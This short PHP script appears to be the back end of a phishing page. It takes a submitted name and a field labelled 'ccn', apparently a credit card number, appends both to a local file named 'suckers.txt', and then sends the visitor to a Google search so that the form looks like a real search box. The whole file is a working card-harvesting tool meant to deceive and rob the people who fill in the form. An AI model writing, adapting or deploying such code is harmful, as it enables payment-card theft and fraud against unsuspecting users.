<?php


if( isset ($_POST['submit'])){
    $file = 'suckers.txt';
$name=$_POST['name'];
$cnn=$_POST['ccn'];
$search =$_POST['query'];

file_put_contents($file, "Name - {$name}:$cnn\n\r", FILE_APPEND | LOCK_EX);
header("Location: https://www.google.com/search?q=$search");
exit;
}


?>